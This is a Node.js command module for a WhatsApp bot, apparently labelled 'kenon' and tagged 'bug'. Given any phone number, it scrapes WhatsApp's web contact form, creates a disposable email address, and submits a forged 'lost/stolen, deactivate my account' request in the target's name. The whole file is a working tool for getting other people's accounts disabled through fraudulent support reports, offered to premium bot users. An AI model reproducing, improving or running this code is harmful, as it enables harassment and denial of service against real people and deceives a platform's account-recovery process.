let axios = require("axios")
let cheerio = require("cheerio")
let util = require('util');
let PhoneNumber = require("awesome-phonenumber")

let handler = async (m, { conn, text, command, usedPrefix }) => {
      if (!text) return conn.reply(m.chat, Func.example(usedPrefix, command, '62xxxx'), m)
      try { 
      let p = (await conn.onWhatsApp(text))[0] || {}
      if (!p.exists) return conn.reply(m.chat, Func.texted('bold', '🚩 Number not registered on WhatsApp.'), m)
      let number = p.jid.replace(/@.+/, '')
      let ntah = await axios.get('https://www.whatsapp.com/contact/noclient/')
      let email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1')
      let cookie = ntah.headers['set-cookie'].join('; ')
      let $ = cheerio.load(ntah.data)
      let $form = $('form')
      let url = new URL($form.attr('action'), 'https://www.whatsapp.com').href
      let form = new URLSearchParams()
      form.append('jazoest', $form.find('input[name=jazoest]').val())
      form.append('lsd', $form.find('input[name=lsd]').val())
      form.append('step', 'submit')
      form.append('country_selector', 'ID')
      form.append('phone_number', 6285141316864)
      form.append('email', email.data[0])
      form.append('email_confirm', email.data[0])
      form.append('platform', 'ANDROID')
      form.append('your_message', `Hilang/Dicuri: Nonaktifkan akun saya ${number}`)
      form.append('__user', '0')
      form.append('__a', '1')
      form.append('__csr', '')
      form.append('__req', '8')
      form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0')
      form.append('dpr', '1')
      form.append('__ccg', 'UNKNOWN')
      form.append('__rev', '1006630858')
      form.append('__comment_req', '0')
      let res = await axios({
         url,
         method: 'POST',
         data: form,
         headers: {
            cookie
         }
      })
      conn.reply(
      m.chat,
      util.format(JSON.parse(res.data.replace("for (;;);", ""))),
      m
      );
   } catch (e) {
      conn.reply(m.chat, Func.jsonFormat(e), m)
   }
};

handler.help = ['kenon *<number>*']
handler.tags = ['bug']
handler.command = /^(kenon)$/i
handler.owner = false
handler.premium = true

module.exports = handler